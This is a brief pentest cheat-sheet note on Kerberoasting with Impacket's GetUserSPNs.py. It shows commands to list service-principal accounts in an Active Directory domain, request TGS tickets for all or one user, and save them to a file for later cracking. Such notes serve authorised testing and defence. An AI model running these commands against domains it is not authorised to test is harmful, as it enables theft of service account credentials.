---
tags:
  - linux
  - kerberoasting
---
# Example Usage
## List SPN Accounts
```shell-session
$ GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER>
Password: ****
```
## Request TGS Tickets
`-request` will request all TGS tickets whereas `-request-user <USER>` will request for that specific user.
```shell-session
$ GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> -request[-user <USER>]
```
## Useful Flags
- `-outputfile`: Save the TGS ticket to a file